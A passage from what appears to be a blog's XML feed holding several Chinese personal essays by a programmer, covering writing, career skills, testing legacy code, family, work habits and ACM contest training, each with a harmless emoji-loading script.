一个我成为「作家（虚伪的）」之前的故事。</p><p>以前我们读书的时候，每天的工作就是写。而现在工作了，扪心自问，又还有谁拿起过笔？恐怕都差不多执笔忘字了吧。</p><p>那为什么我们需要书写？</p><p>众所周知，物理上速度的极限是光速。但撇开物理不谈，比光速更快的，则是人的思维 —— 因为光从地球到火星都需要400秒，而人想一下就到了。</p><p>这不是脑筋急转弯，大部分人应该有过这样的经历：在思考一个问题很久却不得果时，都会试着问一下别人的想法。但当我们把问题描述一次给对方的时候，对方还没做出回答，我们就突然「想通」了。</p><p>这是因为，我们在思考问题的时候，往往已经想明白了各个细节要如何解决，但由于思维速度过快、跳跃性太大，在想细节A的时候、忘记了细节B，想B的时候又忘记了A，从而引起「想不透」或「总觉得哪里不对」的假象。</p><p>而通过文字将问题重新描述一次，实际上就是一个将思考「降速」并「梳理」的过程。因此如果一直想不透一个问题，不妨用笔将其写下来，往往问题就迎刃而解了。有时可能还会因此有意外的收获。</p><p>以上。</p><p>所以….</p><p>所以我好像丝毫没有提到那个故事，这是因为我知道你们不会想看的。</p><p>但其实你已经猜到那个故事了 —— </p><p>所以大家都积极地写一点东西去记录自己的点点滴滴吧！</p><p>或许一开始你可能会纠结怎样可以写出令人眼前一亮的东西，但当你意识到这可以让你更好地思考的时候，你就会摒弃这种纠结。当你慢慢习惯怎样用文字去描述你的想法时，所谓「思如泉涌」也不过如是罢了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重构 </tag>
            
            <tag> 随笔 </tag>
            
            <tag> 暗时间 </tag>
            
            <tag> K.I.S.S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>别让你的能力成为绊脚石</title>
      <link href="/articles/insights/bie-rang-ni-de-neng-li-cheng-wei-ban-jiao-shi/"/>
      <url>/articles/insights/bie-rang-ni-de-neng-li-cheng-wei-ban-jiao-shi/</url>
      
        <content type="html"><![CDATA[<p>在溺水时拼命抓住的，真的是救命稻草吗？</p><p>能力越强的人，往往对自己的能力越是依赖。但相对地，处理危机的灵活性可能就越弱——尤其在环境发生巨大变化时，这种能力或许就是妨碍自身拓展最大的绊脚石。</p><p>人都是善于习惯的动物：长期沉溺在单一的环境中，虽培养了能力、但同时也习惯了一成不变的感觉。尤其是在自身日益卓越的时候，更易于陶醉于自己的能力，稍有不慎便会让自负的优越感侵蚀全身，甚至于逐渐对其他技能产生淡漠感、对环境变化产生迟钝感。</p><p>俗话说“居安思危”。自身能力越是接近临界点的时候，也就是最容易让人安于现状的时候——擅长的能力难以提升、其他能力又无心拓展，一旦连最基本的危机感都失去，离被淘汰也就不远了。在此节骨眼上，往往是我们选择的分岔口：是追求精益求精、抑或探求一专多长？我不能帮任何人做出选择，但我个人认为，仅满足于一种能力对自身未必有益：在职业生涯中需要的能力是多元化的，因为这有利于我们可以在环境变化时快速反应、调整自身。我们更需要的是能及时抓住机遇，永远不要被一叶障目、成为井底之蛙。</p><p>或许终将有一日，海上刮起大浪，我们都翻船了、溺水了。这不是危言耸听。于是乎，我们为了自救，出于本能地拼命去抓住身边能够抓住的一切——而我们的能力就是我们的一切——但若是我们只有一种能力，那么能抓住的就只有这根稻草。这毫无办法，即使我们深知这根稻草恐怕无法让我们活命。</p><p>当然，并不是能力越多，活命的机会就越大，这两者并无绝对的相关性。我只是说，能力越多，我们能够选择自救的机会就越多——或者会出现浮板、甚至是木船——至少不会是那根弱不禁风的稻草。</p><p>我很清楚，我也只是个溺水的人。</p><p>但我们都将会是溺水的人。不过，我们都不应该只有一根稻草。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我们需要的，是测试而非重构</title>
      <link href="/articles/insights/wo-men-xu-yao-de-shi-ce-shi-er-fei-chong-gou/"/>
      <url>/articles/insights/wo-men-xu-yao-de-shi-ce-shi-er-fei-chong-gou/</url>
      
        <content type="html"><![CDATA[<p>上台一鞠躬。是的，久别两个月我又回来了。</p><p>最近忙着杂七杂八的一堆事，不过基本都是维护老项目代码了。一说起这个亘古不变的老话题，估计许多人都要开始抱怨了吧：没有格式没有篇章的混乱、没有甚至是错误的注释、没有说明文档……“我可写不出这种天才代码”、“实在太难看了，我要重构”之类的话我已经听不少了。</p><p>读代码难，但写代码也不见得很容易。老代码们都有着他们自己的项目背景，经手的人也多，日积月累自然而言就变成了现在的样子了。重构——说是很容易的——先不论我们的能力跟当时开发者相比孰优孰劣，他们会写出这样的代码总有他们的理由，只是经过时间的磨蚀，当时的缘由我们就不得而知了。</p><p>重构不是对付老代码最好的手段。重构首先会遇到最大的问题，就是刚才提到的项目背景，大多数的老代码除了满足基本需求功能，后期还会不断临时加入满足某些用户需求的特殊功能，若对这些不了解就轻易地重构，势必造成代码功能缺失。</p><p>之所以那么多人要重构老代码，因为我们都对它恐惧。而恐惧，则是源于我们对它的不了解。维护老代码时，我们怕破坏它的功能、怕造成程序的不稳定……我们维护自己的代码时，何曾会怕这怕那的？希望对老代码进行重构，不过是因为我们想把它变成自己的东西、方便自己操作而已。可一旦交接给下一个人，没准他又开始喊着要重构我们的代码了吧。</p><p>老代码告诉我们的是它的基本的样貌，不到万不得已，不必通过重构对它进行整容。我们只需要使用测试用例，去矫正它在岁月中留下的伤疤。</p><p>事实上，我们也应该强迫自己持续地给老代码做测试。刚开始这样做，可能会使得进度缓慢，但长期下去，我们就会有足够的测试用例，这除了使得老代码的功能可以更健壮，也使得我们对老代码更有信心，无需再过度担心维护代码时带来的副作用。</p><p>打个比方，举重运动员为了变得更健壮，日积月累地训练，终于使得腿部筋腱开始出现断裂。不过他认为持续的锻炼会使自己最终适应这种痛苦。但正如他每次下蹲都要忍受疼痛一样，没有测试用例的老代码在各种新功能附加的重压之下也开始出现扭曲、变形。后来医生告诉他应该重点做康复锻炼，因为只有在复健后，他的肌肉会变得更结实、能够承担更多重量。同样地，针对老代码的既有功能补充测试用例，可以使得老代码更健壮，当以后交接到别人手上的时候，重构的呼声自然也就会减少了。</p><p>不过有的时候，我们拿到手的老代码是已经有一定的测试用例的了，它们也能运行成功，但是这些测试却对理解老代码毫无帮助——有些测试是为了图方便而建立的，它们之所以能运行成功，是因为这些测试都是在假设代码能够顺利运行的理想情况下建立的——我们不需要这种花瓶式的测试用例。</p><p>其实最理想的情况，就是测试用例可以完全覆盖老代码，但实际上不可能——我们也不需要那样做——字典上单词都是用到时才去查的，测试用例也一样，不然你有看到过谁把字典背下来了吗？</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重构 </tag>
            
            <tag> 随笔 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>月缺，梦圆。</title>
      <link href="/articles/insights/yue-que-meng-yuan/"/>
      <url>/articles/insights/yue-que-meng-yuan/</url>
      
        <content type="html"><![CDATA[<p>又是一年中秋时。</p><p>你多久没回家看过父母了？</p><p>……</p><p>一个星期？一个月？抑或，一年？ </p><p>……</p><p>每个孩子从小都有一个愿望：独立。殊不知是狭隘的独立。年少的我们总是向往无拘无束的自由，而这种又总是单纯地诱使我们离开家里。于是选择远一点的地方念书，便成为了最简单的方法。而我，也不例外。</p><p>在我还在读书那会，我不怎么喜欢回家，纯粹只是因为怕麻烦。</p><p>那时候每个节日对我的意义，无非就是一个休息的日子——不管是春节也好，中秋也罢。虽然都会回家一趟看看父母，但总有一种“循例”的感觉在左右。“每逢佳节倍思亲”，那时的我，其实体会不深。</p><p>然后，就毕业了。</p><p>世事往往发生在意料之外、却又意料之中的无能为力。我因为工作来到了广州，可是昔日的同窗好友，却是一个都不在这里。或许只有到了真正举目无亲的时候，那种在语文课本念了几百遍的思乡情怀才真的会油然而生吧。</p><p>我又怎么想到有一天，回家，也会变成一种奢侈。</p><p>父母总是喜欢把我的前途放在首位，每次我打电话回家，跟父母说大概什么时候回去的时候，电话那头总是说：工作要紧，没时间就不用回了。我回家的时候，经常只能待1天、甚至更短，但只要我回去了，他们都会很开心。其实时间长短又何妨，我不过希望可以带回去一份心意，而已。</p><p>或许是成长总会带来一些自负，毕业的时候，我就跟自己说不会再问家里拿1分钱。因为我没有再依赖父母的理由，也没有资格去依赖他们。但是每次在家的时候，父亲总是问我钱够不够花，母亲则总是做一桌子我喜欢的菜。——他们都怕我一个人过得不好。</p><p>其实一个人又有什么所谓好不好的。我隐约觉得，我依赖了父母20年，父母又何尝不是依赖了我20年。只是我突然有一天真的离开了父母，不用他们照顾了，他们少了一份念想，觉得不习惯吧。我现在唯一可以告诉他们的，就是我过得很好，仅此而已。</p><p>我不怕被父母依赖。倒不如说，我希望有能力被父母依赖。早几年前开始，家里的大小事，父亲都会跟我商量。我那时候总跟父亲说：爸，你喜欢就好了，怎么决定我都没意见。有一次我母亲跟我谈到这个，她跟我说：你爸现在谁都不信，最信就是你……。我那天真的觉得，父母真的都已经老了。</p><p>算上大四那年，我出来工作已经一年多了，每次回到窝里，总是空荡荡的，总有种失落感。说真的，我比较怀念上中学的日子，起码每次回家都能看见父母，只悔那时不懂珍惜。</p><p>经常有人问我：你现在工作的地方跟家里那么近，回家不也是很方便吗？是很方便。但是物理上的距离再短，也是距离。影响沟通的距离。这种距离在心里累积起来，会变成难以驱散的孤独感，我不希望父母承受那种孤独感。</p><p>现在虽然父母嘴上不说，但是我知道他们总盼我什么时候能回家，可以见上一面，但又总是怕会烦叨我，没敢叫我回家。这种滋味不好受。所以我现在的愿望，就是可以把父母接到身边，安享晚年。至少，可以让他们少了一份牵挂。“父母在，不远游”，把父母留在家里，是我心头的一根刺。</p><p>之前在网上看过一篇文章：假设父母都能活到100岁，可等到我们工作的时候，他们的人生已经过半了。剩下50年，如果我们每年只回家1次，那也只能再见父母50次而已。我不知道这种日子还能有多长。但我希望在还没有失去的时候，可以好好地珍惜它。</p><p>中秋不过是个传统，我们不应该为了过中秋而过中秋。平时哪怕再忙，也应该常回家看看，好好想想自己的父母、家人。有些恩情，是我们穷尽一辈子都还不了的。</p><p>……</p><p>月有阴晴圆缺。</p><p>但愿人长久，千里共婵娟。</p><p>……</p><p>最后的最后，愿大家中秋阖家团圆，愿天下父母幸福安康。</p><p><img src="./01.png" alt="月亮总是可以把一瞬间的思念，化作永恒…"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请发展你的惰性</title>
      <link href="/articles/insights/qing-fa-zhan-ni-de-duo-xing/"/>
      <url>/articles/insights/qing-fa-zhan-ni-de-duo-xing/</url>
      
        <content type="html"><![CDATA[<p>你工作的时候就只是工作吗？</p><p>我不一定。我有些时候不会把今天的所有时间都用在为了完成今天的工作任务中。而且我也相信，把全部时间都花费在工作并不代表就能很好地完成工作。</p><p>作为一个程序员，我上班时出现过的状态不外乎是三种，如果以键盘作为计量单位，那就是：不停地敲键盘、偶尔敲键盘、和不敲键盘。状态一基本就是忙于开发任务的时候，状态二一般就是调试代码的时候，而状态三就是在做跟当前工作没有直接关联的事情的时候。</p><p>如果把状态一和状态二视为对忠于工作任务的韧性，那么状态三应该就是我对工作的惰性了。不过于我而言，一和二不外乎都是体力劳动的一种，只能使我做完工作，但三却能帮我做好工作。</p><p>众所周知，程序员是脑力工作者，我们的价值在于如何运用我们的脑细胞。同样都是为工作的需求写代码，一套考虑周全的代码总比为了应付工作而写的代码生命力更持久，其维护难度也更低。其实IT行业发展至今，先辈们积累了无数这方面的知识，并作为可利用的财富流传下来，而我至今所学的也不过是沧海一粟。因此我比较喜欢看一些前人总结的经验心得，作为我忙中偷闲的乐趣，而契机不过是恰好工作有需要、或是偶尔的突发奇想罢了。</p><p>并非我们在开发和调试的过程中学不到东西，只不过这些大部分都只能够作为我们自身的经验被积累下来。要把经验转化为知识，是需要时间去顿悟的。相较之下，直接去累积前人有价值的知识，化为己用更为便捷。于当下确实是花费了一点工时，而且也未必对目前的工作任务起到关键性的作用，但之后总有其发挥价值的时候，这我深有体会。</p><p>当然，我对工作的这种惰性，有一部分是源于我对职业的兴趣，这也是使得我能够保持不疲于工作的心态的原因之一。虽然对当下工作任务而言，这种惰性有点不公，但我觉得对以后的工作、乃至于职业而言却是有好处的。</p><p>惰性是一种慢热型的能力，未必适用于所有人。即使要发展惰性，各人方向或许也有所不同，不过都应该要知道把握尺度，不要影响到相关工作的完成质量，毕竟惰性的发展并不是能够对工作不负责的借口。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优雅的烂代码</title>
      <link href="/articles/insights/you-ya-de-lan-dai-ma/"/>
      <url>/articles/insights/you-ya-de-lan-dai-ma/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * ┌───┐   ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐ * │Esc│   │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P/S│S L│P/B│  ┌┐    ┌┐    ┌┐ * └───┘   └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘  └┘    └┘    └┘ * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐ * │~ `│! 1│@ 2│# 3│$ 4│% 5│^ 6│&amp; 7│* 8│( 9│) 0│_ -│+ =│ BacSp │ │Ins│Hom│PUp│ │N L│ / │ * │ - │ * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤ * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │{ [│} ]│ | \ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │   │ * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │ * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│" '│ Enter  │               │ 4 │ 5 │ 6 │   │ * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤     ┌───┐     ├───┼───┼───┼───┤ * │ Shift  │ Z │ X │ C │ V │ B │ N │ M │&lt; ,│> .│? /│  Shift   │     │ ↑ │     │ 1 │ 2 │ 3 │   │ * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││ * │ Ctrl│    │Alt │         Space         │ Alt│    │    │Ctrl│ │ ← │ ↓ │ → │ │   0   │ . │←─┘│ * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘ */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>敏捷开发是当下软件开发的主流模式之一，为了摒弃以往瀑布式开发带来的弊端，敏捷开发推崇在团队中以个人为单位进行简单的模块化开发，它更注重的是团队间的沟通和模块间的衔接。</p><p>为了使代码层面上的沟通更便捷，一套套的编码规范和设计模式应运而生，毫无疑问，使用这些规范模式会使得我们的代码看起来更优雅，经验也证明这更有利于团队沟通。</p><p>对于经验丰富的程序员而言，针对某种功能使用合理的设计模式编写出规范的代码、并提供满足功能调用的接口，可能是易如反掌的事。但每个团队中都不可避免的会存在生涩的程序员，例如我。对我而言这种方式就并不完全是这么回事了。</p><p>即使我作为一个项目经验如何不足的程序员，独立开发一个简单功能模块的能力还是具备的。经常在编写代码之前，我脑中已有完整的思路，我可以很清晰地向别人陈述我的编程思想，我也很有信心可以把这些思想变成代码。但事实上这可能比我想象的要难得多。很多时候我发现我花费了比预期更多的时间，却无法写出一段可执行的代码。因为我在编码的时候，想得更多的不是如何去实现这个功能，而是如何让别人更舒服地看懂我的代码。</p><p>虽然很多开发团队都强调代码的优雅性，但这是以“可运行性”为前提的。这种过分放大观赏性代码的地位，本就是本末倒置的行为。优雅只是交流的辅助手段，但不是唯一的手段。</p><p>事实上，如果仅是实现需求的功能，而不去考虑任何外因，我确信我可以很快地写出一段可运行的“烂代码”。烂代码与优雅代码相比，最表面的区别可能仅是可读性差而已。而且团队开发很多时候并不需要关心别人开发的功能是如何实现的，这些优雅性的问题自然也不会被马上指出来了。</p><p>当然，我并不是倡导每个人都去写烂代码。烂代码只是一个过度的产物，考虑到以后代码的维护性和可扩展性，必须在烂代码保证功能需求后，对其进行重构。而往往优雅地重构自己既成的代码，很可能要比优雅地写出构思中的代码要容易得多。</p><p>摒弃优雅性的约束，烂代码使得开发过程更轻松、耗用资源更少、编程的目的性更强。其实这与敏捷开发的部分理念恰好是一致的：有目的指向的简单构建、有辅助指向的重构勇气。这正是烂代码的优雅之道。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 頂頂頂頂頂頂頂頂頂　頂頂頂頂頂頂頂頂頂 * 頂頂頂頂頂頂頂　　　　　頂頂　　　　　 * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂 * 　　　頂頂　　　頂頂頂頂頂頂頂頂頂頂頂 * 　　　頂頂　　　頂頂　　　　　　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　頂頂　　頂頂頂　　頂頂 * 　　　頂頂　　　　　　　頂頂頂　 * 　　　頂頂　　　　　　頂頂　頂頂　頂頂 * 　頂頂頂頂　　　頂頂頂頂頂　頂頂頂頂頂 * 　頂頂頂頂　　　頂頂頂頂　　　頂頂頂頂 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 敏捷开发 </tag>
            
            <tag> 沟通 </tag>
            
            <tag> 重构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的&quot;病态&quot;</title>
      <link href="/articles/insights/cheng-xu-yuan-de-bing-tai/"/>
      <url>/articles/insights/cheng-xu-yuan-de-bing-tai/</url>
      
        <content type="html"><![CDATA[<p>每个程序员都是从菜鸟过来的，而菜鸟的成长之路总是崎岖的。不断地碰壁、不断地摸索、不断地成长，从中难免衍生出各种各样的“病态”，而这其实都是我们切实作为一个程序员的证明。</p><h2 id="密集空间恐惧症"><a href="#密集空间恐惧症" class="headerlink" title="密集空间恐惧症"></a>密集空间恐惧症</h2><p>这应是程序员的通病了。不知道是谁的谎言：“程序员每天的工作就是看着一堆01代码”，这想着都会令人疯掉吧。每个程序员最怕看到的，就是那些一堆堆没换行没缩进的代码，更何况是一堆01代码。</p><p>如果一个程序员说他没有密集空间恐惧症，那他一定就是这堆代码的创始人之一了。我不理解为什么总有一些程序员要乐此不疲地代替编译器把代码中的空字符删去，编码规范出现的初衷，很可能就是为了对付这些程序员的——即使我忘记了我曾经或许也是他们中的一员。</p><h2 id="强迫症"><a href="#强迫症" class="headerlink" title="强迫症"></a>强迫症</h2><p>一些程序员在开发一个新项目的时候，会考虑太多情况，例如这种代码在以后的运行是否稳定、维护是否方便等。尤其是有一点项目经验但又不足、而且是完美主义者的程序员，在写代码的过程中会不断地考虑设计文档没有的东西，然后就很忘我地在项目代码上画蛇添足。</p><p>往往强迫自己写一个完美的程序的人，其现实就是：由于客观因素影响（如项目工时不足），导致最后提交的代码中出现太多没有被实现的抽象方法，结果反而是自己给自己挖了一堆无法填补的坑。</p><h2 id="神经质"><a href="#神经质" class="headerlink" title="神经质"></a>神经质</h2><p>基本上每个正常的程序员都有点神经质的。一个显著的特点就是：我们对自己的代码充满信心、但看到别人的代码都会疑神疑鬼，习惯性地认为那有BUG，然后千方百计地将其找出来。如果有能力把BUG修复，还会因此感到非常有成就感，尽管那个BUG是无关痛痒的。</p><p>程序界有一个“潜规则”：每个程序中 80% 的 BUG 都是别人发现的。这跟程序员的神经质应是脱不了干系了。</p><h2 id="妄想症"><a href="#妄想症" class="headerlink" title="妄想症"></a>妄想症</h2><p>大部分程序员最初接触到一些已经投入使用、但看上去写得很差的项目代码时，就会开始妄想自己的能力，认为自己可以用最好的技术去重写它。由于是一时冲动，欠缺考虑因素太多（如背景、支撑环境等），往往都是失败告终。</p><p>其唯一的好处可能就是在重写的过程中，可能确实学到了一些未能投入使用的新技术，仅此而已。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作需要经营</title>
      <link href="/articles/insights/gong-zuo-xu-yao-jing-ying/"/>
      <url>/articles/insights/gong-zuo-xu-yao-jing-ying/</url>
      
        <content type="html"><![CDATA[<p>转眼间我已实习了3个月有余，在这期间，相比于精通什么技能或业务，我更学会了应该如何去经营自己的工作。</p><p>我深深体会到工作并不是做好自己的份内事就足够的。单纯的努力工作，那只是为了谋生所付出的劳动；用心去经营的工作，才有可能会变成自己的事业。</p><h2 id="智于心，慧于行：审视自己的工作模式"><a href="#智于心，慧于行：审视自己的工作模式" class="headerlink" title="智于心，慧于行：审视自己的工作模式"></a>智于心，慧于行：审视自己的工作模式</h2><p>在公司里面，我被告知得更多的是如何去改善自己的工作模式，其中最倡导的是尽可能避免无意义的重复劳动。确实，平时与我们工作打交道的是各种各样的数据，要逐一去处理这些本质一样而问题各异的数据，无疑是事倍功半的行为。</p><p>好的工作模式，不仅可以提升工作效率，使我们逃离无意义劳动的怪圈，还可以实现公司价值和自身价值的双赢。而工作模式的优化，关键在于不断积累的经验。</p><p>例如平时可以多留一个心眼，把新的想法或遇到的问题进行记录，这样日积月累下来，在遇到新的问题时就不至于手忙脚乱，甚至可以利用以往类似的处理经验，达到事半功倍的效果。</p><p>不过，有好的想法固然不错，但更重要的是将其付诸行动，找到一种属于自己的工作模式，而不仅仅是纸上谈兵。</p><h2 id="慎言笃行：真诚做人，踏实做事"><a href="#慎言笃行：真诚做人，踏实做事" class="headerlink" title="慎言笃行：真诚做人，踏实做事"></a>慎言笃行：真诚做人，踏实做事</h2><p>“真诚做人，踏实做事”，这其实也就是我入职时了解到的企业文化之一。</p><p>做事先做人，人脉关系是经营工作的必修课。在我看来，交际圈的尺寸，与能否诚心待人是正相关的。但无论与他人相处如何，都必须谨慎言行，视场合说话。语言是把双刃剑，所谓“祸从口出”，当不知道说什么的时候，既不是阿谀奉承，也不应论人是非——不逞口舌之快，有时踏踏实实多做事，远比一切语言更具说服力。</p><p>想起我刚入职的时候，就接到了一个特殊“任务”：必须在限期内认识组内所有同事，并让他们认识我。这确实不是一个好差事，因为当时我连组内有哪些人都不清楚，就是说我连自我介绍的对象都没有……不过也不知是我人缘好还是面皮厚，这个任务最后还是完成了。</p><p>而现在的我已经结识不少其他部门的同事了，在这段期间，受到了非常多同事的包容和照顾，其实我能够这么快融入公司，离不开同事之间的良好氛围。我都甚至觉得，我的人际关系，其实是大家帮我经营起来的。</p><h2 id="云在青天水在瓶：心态决定位置"><a href="#云在青天水在瓶：心态决定位置" class="headerlink" title="云在青天水在瓶：心态决定位置"></a>云在青天水在瓶：心态决定位置</h2><p>这其实是我比较信奉的一句座右铭。云和水都是同一种物质，但是它们的形态决定了它们所处的位置。但也不应该因为身处青天而自傲，因为身处瓶中而自卑。</p><p>在职期间，我并不是所有工作都一帆风顺，我也因为规范性事故受过批评、被扣过绩效。后来也因为工作表现好而受到了表扬和奖励。但其实我个人看待事情的心态是比较淡薄的，我不会随便自暴自弃，也不会骄傲自负。我觉得既然是自己的问题，就应该承认并纠正，逃避并不是解决问题的方法；而对于嘉许，平常心看待即可。</p><p>我觉得相比于工作模式和人脉培养，工作其实更依赖于内心的修养。一份良好的心态，在一定程度上可以反映出以后工作的发展空间、以及对挫折的承受能力，甚至为自己提供了一个精神支持。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一位 ACMer 过来人的心得</title>
      <link href="/articles/insights/yi-wei-acmer-guo-lai-ren-de-xin-de/"/>
      <url>/articles/insights/yi-wei-acmer-guo-lai-ren-de-xin-de/</url>
      
        <content type="html"><![CDATA[<p>刻苦的训练我打算最后稍微提一下。主要说后者：什么是有效地训练？</p><p>我想说下我的理解。</p><p>很多ACMer入门的时候，都被告知：要多做题，做个500多道就变牛了。其实，这既不是充分条件、也不会是必要条件。</p><p>我觉得一般情况下，对于我们普通学校的大学生，各方面能力的差距不会太大，在这种情况下，训练和学习的方法尤为重要。</p><p>其实，500题仅仅是一个标志，而且仅仅表示你做 ACM-ICPC 有一定的时间。</p><p>我们训练的目的是什么？我觉得有四点：</p><ul><li>提高编程能力</li><li>学习算法（读书，读论文，包括做一些题目验证）</li><li>准备好面临将到来的挑战（熟悉题型，调整心态）</li><li>启发思维</li></ul><p>这里四个目的，从训练的角度上，重要性逐次递减；为什么呢？</p><p>因为前面的因素是后面的基础。而是后面的目的，想达成越为不易。我觉得前3者能保证你ac掉你能做的题，即使难题始终不会做，也可以ac掉中等偏难的题目。</p><p>而需要一定思维难度的题，要以前三者为基础而且属于训练的后期，中期只能作为偶尔调节。当然，我思维也烂得要死，对这点没什么发言权，大家可以鄙视我。</p><p>我这里想主要说下第2点。</p><p>对于算法，我发现，很多我们这样的弱校ACMer选手没有侧重好算法的学习。</p><p>下面要讲的几点，可能都很老套，但我想以035对比我自己的例子给大家做说明。</p><h2 id="算法学习是ACM比赛所要推广或者要提倡的一个方面"><a href="#算法学习是ACM比赛所要推广或者要提倡的一个方面" class="headerlink" 